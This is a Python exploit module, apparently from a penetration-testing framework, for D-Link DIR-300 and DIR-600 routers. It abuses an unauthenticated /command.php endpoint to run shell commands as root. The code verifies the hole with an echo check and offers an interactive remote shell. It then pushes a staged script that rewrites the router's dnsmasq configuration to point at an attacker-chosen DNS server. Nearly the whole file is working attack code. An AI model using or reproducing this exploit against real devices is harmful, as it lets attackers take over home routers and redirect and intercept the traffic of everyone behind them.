#coding: utf-8
'''
@Test list:
dir 600 2.11
'''
import datetime
from routelib import *
from exp_template import *
    
class dir_300_600_rce(Exploit):
    def __init__(self, url, taskid=0, targetid=0, cmd_connect='', data_redirect='', dns_server='', proxies={}):
        self.url = url
        self.taskid = taskid
        self.targetid = targetid
        self.cmd_connect = cmd_connect
        self.data_redirect = data_redirect
        self.dns_server = dns_server
        self.proxies = proxies
        self.log_data = []
        self.shell_data = []
        
    def meta_info(self):
        return {
            'name': 'dir_300_600_rce',
            'author': '赵旭',
            'date': '2018-03-15',
            'attack_type': 'RCE',
            'app_type': 'Router',              #路由器为Router
            'app_name': 'D-Link',
            'min_version': '',
            'max_version': '',
            'version_list': ['DIR-600','DIR-300'],             #min_version,max_version 和 verion_list 二者必选其一
            'description': 'Module exploits D-Link DIR-300, DIR-600 Remote Code Execution vulnerability which allows executing command on operating system level with root privileges.',
            'reference':[
                'http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router',
                'http://www.s3cur1ty.de/home-network-horror-days',
                'http://www.s3cur1ty.de/m1adv2013-003',
            ],   #参考文档
        }
        
    def exploit(self):
        if self.check():
            self.report("Target is vulnerable")
            self.report("DNS Poisoning...")
            #self.command_stager()
            self.dns_poison(self.dns_server)

        else:
            self.report("Target is not vulnerable",Level.warming)
        self.report('Exploit is complete')


    def dns_poison(self,new_dns_server='192.168.220.5', dns_conf_path='/var/servd/DNS.conf', restart_cmd='"dnsmasq -C /var/servd/DNS.conf"'):
        every_send = 100
        completed = 0
        dns_handle = dns.dnsmasq_poison(self.dns_server)
        dns_shell = dns_handle.get_dns_poison_shell_cmds(every_send)
        wf = dns_shell['script_name']
        total_size = dns_shell['size']
        for cmd in dns_shell['cmds']:
            completed += every_send
            self.execute(cmd)
            if completed >= total_size:
                completed = total_size
            self.report('Command Stager progress - %.2f%% done (%d/%d) bytes' % (float(completed)/total_size*100, completed, total_size))

        chmod_dns_shell = 'chmod +x %s && echo' % wf
        #execute_dns_shell = '%s %s %s %s && echo' % (wf,dns_conf_path,new_dns_server,restart_cmd)
        execute_dns_shell = '%s && echo' % (wf)

        self.report('Command: "%s" done.' % chmod_dns_shell)
        self.execute(chmod_dns_shell)
        #print execute_dns_shell
        self.report('Command: "%s" done.' % execute_dns_shell)

        result = self.execute(execute_dns_shell)

    def command_stager(self):
        while True:
            cmd = raw_input("# ")
            if cmd in ['exit', 'quit']:
                return
            self.report(self.execute(cmd))

    def execute(self, cmd):
        req = session()
        url = "{}/command.php".format(self.url)
        headers = {u'Content-Type': u'application/x-www-form-urlencoded'}
        data = "cmd={}".format(cmd)

        response = None
        try:
            response = req.post(url=url, headers=headers, data=data)
            if response is None:
                return ""
        except requests.Timeout as err:
            pass
            self.report(err.message,Level.warming)
        except requests.ConnectionError as err:
            pass
            self.report(err.message,Level.warming)
        if response is None:
            return ""
        return response.text.strip()

    def check(self):
        mark = random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
        
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print 'Usage(e.g.): dir_300_600_rce.py http://192.168.0.1:8080 119.6.6.6'
        exit(0)
    e = dir_300_600_rce(sys.argv[1],dns_server=sys.argv[2])
    e.exploit()
        
        
        
